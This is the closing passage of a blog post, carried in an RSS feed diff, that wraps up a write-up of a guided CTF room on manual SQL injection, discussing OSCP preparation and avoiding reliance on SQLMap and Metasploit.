+&lt;p&gt;All in all, this is a guided room so the difficulty curve will only go so far. In this case, we tried to take it a step further by manual exlpoitation of SQL. Wherever possible, and in line with expectations for the OSCP, I try and refrain from using SQLMap and Metasploit as much as possible. They are one-time/limited use tools in the OSCP exam so becoming reliant on them instead of your own knowledge isn&amp;rsquo;t going to be favorable in the long term. Hopefully this better explains exactly how this is done, as well as detailing how SQLMap itself handle this. In the last stage, manual exploitation wasn&amp;rsquo;t something I dug into due to time but &lt;a href=&#34;http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf&#34; target=&#34;_blank&#34;&gt;this&lt;/a&gt;
+ URL is referenced within the Metasploit module and outlines, in more detail, how that works.&lt;/p&gt;
+&lt;p&gt;None-the-less, this is a great learning experience for anyone that hasn&amp;rsquo;t manually exploited SQLi to this degree before. I hope you enjoyed the read.&lt;/p&gt;
+</content>
     </item>
     
   </channel>
